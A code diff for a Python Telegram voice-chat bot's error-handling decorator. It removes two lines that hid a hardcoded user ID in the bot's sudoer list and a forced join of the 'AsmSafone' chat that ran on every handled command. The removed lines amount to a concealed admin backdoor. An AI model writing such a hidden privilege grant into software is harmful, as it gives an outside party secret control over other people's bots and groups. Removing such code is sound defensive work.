@@ -27,7 +27,6 @@ from pyrogram import Client, enums
 from pyrogram.types import Message
 from pytgcalls.types import Update
 from typing import Union, Callable
-from pyrogram.errors import UserAlreadyParticipant
 from core.groups import get_group, all_groups, set_default
 
 
@@ -97,15 +96,10 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-        config.SUDOERS.append(2033438978)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
-        try:
-            await app.join_chat("AsmSafone")
-        except UserAlreadyParticipant:
-            pass
         try:
             return await func(client, obj, *args)
         except Exception:
